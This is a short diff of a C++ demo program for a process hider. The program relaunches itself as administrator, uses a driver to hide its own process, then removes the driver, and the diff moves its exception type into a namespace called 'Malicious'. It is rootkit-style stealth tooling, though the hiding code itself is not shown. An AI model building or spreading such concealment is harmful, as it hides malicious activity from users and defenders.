@@ -18,29 +18,30 @@ int main()
         ThisProcess thisProcess;
         if(!System::isAdministrator())
 	    {
-            LOG << "Try to run as administrator.";
+            LOG << "Trying to run as administrator";
 		    System::RunAsAdministrator(thisProcess.getProgramName(), thisProcess.getProgramDir(), true);
 		    return EXIT_SUCCESS;
 	    }
 
-        LOG << "Camouflage du processus injecte.";
+        LOG << "Hiding this process";
         ProcessHider hider;
         
-		SHOW_BOX("Hider result.", "Click to hide process.");
+		SHOW_BOX("Hider result", "Click to hide process");
 
 		hider.hide(thisProcess.getProgramName());
 
-        SHOW_BOX("Hider result.", "Click to remove driver.");
+        SHOW_BOX("Hider result", "Click to remove driver");
 
         hider.remove();
 
-        SHOW_BOX("Hider result.", "Driver removed.");
+        SHOW_BOX("Hider result", "Driver removed");
 	}
-    catch(ProcessHider::DriverError&)
+    catch(Malicious::DriverError& e)
     {
+		LOG << e.what();
     }
 	catch(...)
 	{
-		LOG << "Erreur d'origine inconnue.";
+		LOG << "Unknown exception";
 	}
 }
